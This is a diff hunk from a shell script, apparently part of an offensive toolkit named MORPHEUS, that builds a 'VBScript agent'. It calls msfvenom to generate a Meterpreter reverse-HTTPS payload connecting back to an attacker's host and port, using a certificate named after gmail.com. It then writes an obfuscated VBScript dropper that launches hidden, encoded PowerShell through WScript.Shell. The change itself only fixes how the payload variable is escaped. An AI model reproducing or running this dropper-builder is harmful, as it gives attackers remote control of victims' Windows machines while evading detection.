@@ -2829,7 +2829,7 @@ elif [ "$form" = "Build VBScript agent" ]; then
   sleep 2
   xterm -T "MORPHEUS - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
   disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
-  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wINe\"+\"NPoW\"&\"eR1no\"+\"PSh\"&\"ElLn\"+\"oNI\":f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" \$disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/agent.vbs
+  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wINe\"+\"NPoW\"&\"eR1no\"+\"PSh\"&\"ElLn\"+\"oNI\":f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" $disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/agent.vbs
 else
   echo ${BlueF}[☠]${white} Building http agent.ps1 ..${Reset};
   sleep 2
